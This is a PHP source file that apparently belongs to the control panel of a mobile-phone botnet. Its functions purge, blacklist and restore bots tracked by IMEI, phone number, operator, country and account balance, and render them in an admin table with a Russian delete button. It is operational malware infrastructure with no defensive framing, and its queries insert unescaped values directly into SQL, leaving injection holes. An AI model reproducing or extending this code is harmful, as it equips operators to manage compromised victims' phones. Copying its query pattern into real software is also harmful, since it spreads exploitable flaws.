<?php

function clear_bot($clear, $days, $db)
{
	if ($clear == 1)
	{
		$query = mysql_query("DELETE FROM list", $db) or die(mysql_error());
	}
	if ($clear == 2)
	{
		$query = mysql_query("SELECT * FROM list WHERE operator=''", $db) or die(mysql_error());
		while ($queryrow = mysql_fetch_array($query))
		{
			$IMEI = $queryrow['IMEI'];
			$query_2 = mysql_query("DELETE FROM list WHERE IMEI='$IMEI'", $db) or die(mysql_error());
		}
	}
	if ($clear == 3)
	{
		$days_sec = $days * 24 * 60 * 60;
		$date = date("Y-m-d");
		$date_unix = (strtotime($date) - $days_sec);

		$query = mysql_query("SELECT * FROM list", $db) or die(mysql_error());
		while ($queryrow = mysql_fetch_array($query))
		{
			$last_active = $queryrow['last_active'];
			$date_unix_last_active = (strtotime($last_active));
			$IMEI = $queryrow['IMEI'];
			if ($date_unix_last_active < $date_unix)
			{
				$query_2 = mysql_query("DELETE FROM list WHERE IMEI='$IMEI'", $db) or die(mysql_error());
			}
		}
		
	}

	return $queryrow;
	
}






function replace_bot($one_choice, $value, $db)
{
	if ($one_choice == 1)
	{
		$query = mysql_query("SELECT * FROM list WHERE IMEI='$value'", $db) or die(mysql_error());
	}
	if ($one_choice == 2)
	{
		$query = mysql_query("SELECT * FROM list WHERE phone='$value'", $db) or die(mysql_error());
	}

	$queryrow = mysql_fetch_array($query);
	$date = $queryrow['date'];
	$country = $queryrow['country'];
	$phone = $queryrow['phone'];
	$operator = $queryrow['operator'];
	$IMEI = $queryrow['IMEI'];
	$balance = $queryrow['balance'];
	
	$query_2 = mysql_query("INSERT INTO black_list (date, country, phone, operator, IMEI, balance) VALUES ('$date', '$country', '$phone', '$operator', '$IMEI', '$balance')", $db) or die(mysql_error());
	$query_3 = mysql_query("DELETE FROM list WHERE date='$date' AND country='$country' AND phone='$phone' AND operator='$operator' AND IMEI='$IMEI' AND balance='$balance'", $db) or die(mysql_error());
	return $queryrow;
	
}

function replace_bot_2($IMEI_del, $phone_del, $db)
{
	if ($IMEI_del == TRUE)
	{
		$query = mysql_query("SELECT * FROM black_list WHERE IMEI='$IMEI_del'", $db) or die(mysql_error());
	}
	else
	{
		$query = mysql_query("SELECT * FROM black_list WHERE phone='$phone_del'", $db) or die(mysql_error());
	}

	$queryrow = mysql_fetch_array($query);
	$date = $queryrow['date'];
	$IMEI = $queryrow['IMEI'];
	$country = $queryrow['country'];
	$phone = $queryrow['phone'];
	$operator = $queryrow['operator'];
	$balance = $queryrow['balance'];
	
	$query_2 = mysql_query("INSERT INTO list (date, country, phone, operator, IMEI, balance, last_active, active_1, active_2, active_3, active_4) VALUES (now(), '$country', '$phone', '$operator', '$IMEI', '$balance', '0', '0' ,'0' ,'0' ,'0')", $db) or die(mysql_error());
	$query_3 = mysql_query("DELETE FROM black_list WHERE date='$date' AND country='$country' AND phone='$phone' AND operator='$operator' AND IMEI='$IMEI' AND balance='$balance'", $db) or die(mysql_error());
	return $queryrow;
	
}

function select_bots($db)
{
	$query = mysql_query("SELECT * FROM black_list ORDER BY date DESC", $db) or die(mysql_error());


while ($queryrow = mysql_fetch_array($query))
	{
		$date = $queryrow['date'];
		$country = $queryrow['country'];
		$phone_del = $queryrow['phone'];
		$IMEI_del = $queryrow['IMEI'];
		$balance = $queryrow['balance'];
		$operator = $queryrow['operator'];


		$query_2 = mysql_query("SELECT * FROM countries WHERE iso1_code='$country' LIMIT 1", $db) or die(mysql_error());
		$queryrow_2 = mysql_fetch_array($query_2);
		$country = $queryrow_2['name'];

		if ($queryrow_2['name'] == FALSE)
		{
			$country = "Unknown";
		}
		else
		{
			$country = $queryrow_2['name'];
		}

		$date = date("d.m.Y H:i", (strtotime($date)));
		$country_flag = "<img width='30' src='images/flags/".$country.".png'>";


		$mess .= <<<HERE
		<tr>
		<td align='center'><div class='text'>{$date}</div></td><td align='center'>{$country_flag}</div><br><div class='text'>{$country}</div></td><td align='center'><div class='text'>{$phone_del}</div></td><td align='center'><div class='text'>{$IMEI_del}</div></td><td align='center'><div class='text'>{$operator}</div></td><td align='center'><div class='text'>{$balance}</div></td><td align='center'><form name='delete_bot' method='post' action='$_SERVER[REQUEST_URL]'><input type='hidden' name='IMEI_del' value='$IMEI_del'><input type='hidden' name='phone_del' value='$phone_del'><input type='submit' value='Удалить'></form></td></tr><tr><td colspan='7'><hr width='95%'></td></tr>
		</tr>
HERE;

	}

	return $mess;
	
}
?>